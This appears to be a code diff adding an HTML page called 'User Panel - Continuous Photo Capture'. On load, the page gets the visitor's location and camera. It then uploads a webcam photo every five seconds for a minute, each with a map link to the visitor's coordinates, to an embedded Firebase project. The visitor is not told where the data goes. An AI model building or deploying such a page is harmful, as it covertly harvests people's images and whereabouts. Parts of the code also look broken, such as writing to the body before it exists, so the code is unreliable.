@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>User Panel - Continuous Photo Capture</title>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+    import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-storage.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";
+
+    // Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyDQXDQ7as5SIIbHAsXuagTbgt89HcdvoKQ",
+      authDomain: "vido-e05d7.firebaseapp.com",
+      projectId: "vido-e05d7",
+      storageBucket: "vido-e05d7.appspot.com",
+      messagingSenderId: "169899782442",
+      appId: "1:169899782442:web:6beb259b6eba97e6972e53"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const storage = getStorage(app);
+    const db = getFirestore(app);
+
+    const video = document.createElement('video');
+    document.body.appendChild(video);
+    const canvas = document.createElement('canvas');
+    canvas.style.display = "none";
+    document.body.appendChild(canvas);
+    const context = canvas.getContext('2d');
+    const status = document.createElement('p');
+    document.body.appendChild(status);
+
+    const maxCaptureTime = 60 * 1000; // 1 minute in milliseconds
+    const intervalTime = 5000; // Capture a photo every 5 seconds
+
+    let captureTimer;
+    let totalTime = 0;
+    const location = await getCurrentLocation();
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(async (stream) => {
+        video.srcObject = stream;
+        video.play();
+        status.textContent = "Fetching location...";
+
+        captureAndUploadPhotos(stream);
+      })
+      .catch(err => {
+        console.error('Camera Error:', err);
+        alert("Please check your camera permissions.");
+      });
+
+    // Get the current location (latitude and longitude)
+    function getCurrentLocation() {
+      return new Promise((resolve, reject) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const latitude = position.coords.latitude;
+              const longitude = position.coords.longitude;
+              resolve({ latitude, longitude });
+            },
+            (error) => {
+              console.error('Location Error:', error);
+              alert("Unable to fetch location. Ensure location services are enabled.");
+              reject(error);
+            }
+          );
+        } else {
+          alert("Geolocation is not supported by your browser.");
+          reject(new Error("Geolocation not supported"));
+        }
+      });
+    }
+
+    // Capture and upload photos every 5 seconds for 1 minute
+    async function captureAndUploadPhotos(stream) {
+      status.textContent = "Starting photo capture...";
+      
+      captureTimer = setInterval(async () => {
+        if (totalTime >= maxCaptureTime) {
+          clearInterval(captureTimer);
+          stopCamera(stream);
+          status.textContent = "Photo capture completed.";
+          return;
+        }
+
+        // Capture a photo
+        const photoBlob = await capturePhoto();
+        if (!photoBlob) {
+          console.error("Failed to capture photo.");
+          return;
+        }
+
+        // Upload the photo
+        await uploadPhoto(photoBlob, location);
+        totalTime += intervalTime;
+      }, intervalTime);
+    }
+
+    // Capture a photo from the video stream
+    function capturePhoto() {
+      return new Promise((resolve) => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob((blob) => {
+          resolve(blob);
+        }, 'image/png');
+      });
+    }
+
+    // Upload the photo to Firebase
+    async function uploadPhoto(blob, location) {
+      const fileName = `photo_${Date.now()}.png`;
+      const photoRef = ref(storage, fileName);
+
+      try {
+        status.textContent = `Uploading photo...`;
+
+        const snapshot = await uploadBytes(photoRef, blob);
+        const downloadURL = await getDownloadURL(snapshot.ref);
+
+        const locationLink = `https://maps.google.com/?q=${location.latitude},${location.longitude}`;
+
+        // Save photo URL and location to Firestore
+        await addDoc(collection(db, "photos"), {
+          url: downloadURL,
+          location: locationLink,
+          timestamp: new Date().toISOString(),
+        });
+
+        console.log(`Uploaded: ${downloadURL}`);
+        console.log(`Location: ${locationLink}`);
+        status.textContent = "Photo uploaded successfully!";
+      } catch (error) {
+        console.error("Upload Error:", error);
+        status.textContent = "Error uploading photo. Please try again.";
+      }
+    }
+
+    // Stop the camera after all photos are captured
+    function stopCamera(stream) {
+      stream.getTracks().forEach(track => track.stop());
+      video.style.display = "none";
+      status.textContent = "Photo capture complete.";
+    }
+  </script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    video {
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 500px;
+    }
+    p {
+      font-size: 18px;
+      margin: 10px 0;
+    }
+  </style>
+</head>
+<body>
+  <h1>User Panel - Continuous Photo Capture</h1>
+  <video id="videoElement" autoplay playsinline></video>
+</body>
+</html>
